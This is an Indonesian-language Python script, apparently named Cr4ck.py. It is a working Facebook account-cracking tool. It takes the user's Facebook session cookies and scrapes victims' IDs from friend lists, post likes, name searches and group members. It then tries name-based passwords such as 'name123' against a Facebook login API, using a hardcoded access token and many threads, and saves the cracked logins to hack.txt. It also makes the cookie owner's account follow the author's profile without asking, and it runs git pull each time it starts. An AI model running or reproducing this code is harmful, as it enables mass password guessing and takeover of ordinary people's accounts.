#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#Code by YayanXD 
#5 September 2020
#My facebook (https://www.facebook.com/KM39453)
import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor

def perbarui():
    os.system("git pull")
def clear():
    os.system("clear")
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def baner():
    time.sleep(0.3)
    kata("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
     ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
     ██║     ██████╔╝███████║██║     █████╔╝ 
\x1b[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
     ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD
\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Yayan-XD
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
\x1b[1;94m────────────────────────────────────────────────────""")

def jembut():
    print("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
     ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
     ██║     ██████╔╝███████║██║     █████╔╝ 
\x1b[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
     ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD
\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Yayan-XD
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
\x1b[1;94m────────────────────────────────────────────────────""")

def yayanxd():
    yayan=input("\n\033[00m\t  [\033[96m Tekan Enter Untuk Kembali\033[97m ] ")
    if yayan == "": 
       os.system("python Cr4ck.py")
    else:
       sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97] \033[1;91mSelamat Tinggal :')")
def moch_yayan():
    time.sleep(0.1)
    print("\033[97m [\033[96m01\033[97m] Start  Cr4ck ID")
    print("\033[97m [\033[96m02\033[97m] Turtor Cara Dapatkan Cokies Fb")
    print("\033[97m [\033[96m03\033[97m] Joined Grup Fb ❤️ RATU ERROR ❤️")
    print("\033[97m [\033[96m04\033[97m] Joined Grup Fb Viral")
    print("\033[97m [\033[96m05\033[97m] Update Tools")
    print("\033[97m [\033[91m00\033[97m] Exit")
    print("\x1b[1;94m────────────────────────────────────────────────────")
    time.sleep(0.1)

    yayan=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
    if yayan == "1" or yayan =="01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         hack = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                   clear()
                   baner()
                   cek = input("\n\033[0;92m  [ \033[0;97mTools Ini Menggunakan Cokiies Facebook \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
                   print('\n\033[97m [\033[92m+\033[97m] \033[92mMohon Tunggu...')
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/KM39453"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
                     kata('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Berhasil')
             else:
                  os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
                  os.system('rm -rf cookies')
                  print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                  os.system('python Cr4ck.py')
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[1;97m [\033[1;92m✓\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('hack.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[1;97m [\033[1;93m×\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] hacked : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProses Mendapatkan ID... ",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit(" \033[1;97m [\033[1;94m•\033[1;97m] Id Tidak Ada! ")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProses Mendapatkan ID... ',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProses Mendapatkan ID... ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProses Mendapatkan ID... ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   clear()
                   baner()
                   kata('\033[1;97m [\033[1;92m01\033[1;97m] Crack Dari Teman')
                   kata('\033[1;97m [\033[1;92m02\033[1;97m] Crack Dari Link Post ')
                   kata('\033[1;97m [\033[1;92m03\033[1;97m] Crack Dari Pencarian Nama')
                   kata('\033[1;97m [\033[1;92m04\033[1;97m] Crack Dari Dari Grup')
                   kata('\033[1;97m [\033[1;92m05\033[1;97m] Crack Dari ID Publik ')
                   kata('\033[1;97m [\033[1;92m06\033[1;97m] Lihat Hasil Crack')
                   kata('\033[1;97m [\033[1;92m07\033[1;97m] Hapus Cookies')
                   kata('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                   kata('\x1b[1;94m────────────────────────────────────────────────────')
                   memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                   if memek =="":
                         exit("\033[00m [\033[91m!\033[00m] Lihat Menu Dong")
                   elif memek == '0' or memek =='00':
                         kata("\n\033[1;92m Terimakasih Sudah Memakai Tools Saya\n Jangan lupa Subscribe My YouTube Channel...\n\n")
                         os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
                         exit()                   	
                   elif memek == '7' or memek =='07':
                         print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mMohon Tunggu... ")
                         kata("\x1b[1;92m • 10")
                         kata("\x1b[1;93m •• 20")
                         kata("\x1b[1;94m ••• 30")
                         kata("\x1b[1;95m •••• 40")
                         kata("\x1b[1;96m ••••• 50")
                         kata("\x1b[1;97m •••••• 60")
                         kata("\x1b[1;92m ••••••• 70")
                         kata("\x1b[1;91m •••••••• 80")
                         kata("\x1b[1;96m ••••••••• 90")
                         kata("\x1b[1;94m •••••••••• 100%")
                         os.system("rm -rf cookies")
                         print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Berhasil Terhapus!")
                         yayanxd()
                   elif memek == '1' or memek =='01':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif memek == '2' or memek =='02':
                         username = input("\033[1;97m [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Link Post Slh!")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif memek == '3' or memek =='03':
                         knf = input("\033[1;97m [\033[1;96m?\033[1;97m] Nama Yang Mau Anda Cari \033[1;91m: \033[1;92m")
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[90m] Tidak Ada Nama!")
                   elif memek == '4' or memek =='04':
                         print("\033[1;97m [\033[1;94m•\033[1;97m] Hanya Bisa Mengambil \033[91m100 \033[00mID ")
                         grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m] ID Grup Tidak ada!")
                   elif memek == '5' or memek =='05':
                         knf = input("\033[1;97m [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[00m[\033[91m!\033[00m] \033[97mUsername/ID Tidak Ada!")
                   elif memek == '6' or memek =='06':
                         try:
                                 file1 = open("check.txt").read()
                                 file2 = open("hack.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[97m [\033[93m{str(len(final))}\033[97m] Akun Untuk Diperiksa ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 os.remove("check.txt")
                                 os.remove("hack.txt")
                                 for x in life:
                                         with open('hack.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('check.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Selesai....")
                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcheck.txt\033[96m|\033[1;92mhack.txt")
                         except FileNotFoundError:
                                 exit("\n\033[00m[\033[91m!\033[00m] Kamu Tidak Mendapatkan Hasil")
                   else:
                         exit("\033[00m[\033[91m!\033[00m] Lihat Menu Dong")
                   print()
                   clear()
                   jembut()
                   print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
                   expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan1 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan2 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan3 \033[1;91m: \033[1;92m")
                   kata('\x1b[1;94m────────────────────────────────────────────────────\n')
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123',
                                                  str(x) + '1234',
                                                  str(x) + '12345',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;94m────────────────────────────────────────────────────")
                           print("\x1b[1;97m [\x1b[1;94m•\x1b[1;97m] Crack Selesai...")
                           print("\x1b[1;97m [\x1b[1;94m✓\x1b[1;97m] Hacked     \x1b[1;94m: \033[92mhack.txt")
                           print("\x1b[1;97m [\x1b[1;91m×\x1b[1;97m] Checkpoint \x1b[1;94m: \033[93mcheck.txt")
                           print("\x1b[1;94m────────────────────────────────────────────────────")
                   
                   else:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;94m────────────────────────────────────────────────────")
                           print("\x1b[1;97m [\x1b[1;94m•\x1b[1;97m] Crack Selesai...")
                           print("\x1b[1;97m [\x1b[1;91m×\x1b[1;97m] Tidak ada hasil")
                           print("\x1b[1;94m────────────────────────────────────────────────────")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] Tidak Ada Koneksi")

    elif yayan == "2" or yayan =="02":
         os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
         yayanxd()
    elif yayan == "3" or yayan =="03":
         os.system('xdg-open https://www.facebook.com/groups/1683226775285117')
         yayanxd()
    elif yayan == "4" or yayan =="04":
         os.system('xdg-open https://www.facebook.com/groups/453688872336137')
         yayanxd()
    elif yayan == "5" or yayan =="05":
         print("\n\n\x1b[1;97m    [ \x1b[1;92mMohon Tunggu Sedang Mengupdate Tools \x1b[1;97m]\n")
         os.system("git pull")
         print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Berhasil Di Update!\n ")
         yayanxd()
    elif yayan == "0" or yayan =="00":
         kata("\n\033[1;92m Terimakasih Sudah Memakai Tools Saya\n Jangan lupa Subscribe My YouTube Channel...\n\n")
         os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
         exit()                   	

if __name__=="__main__":
     clear()
     perbarui()
     clear()
     baner()
     moch_yayan()
     yayanxd()

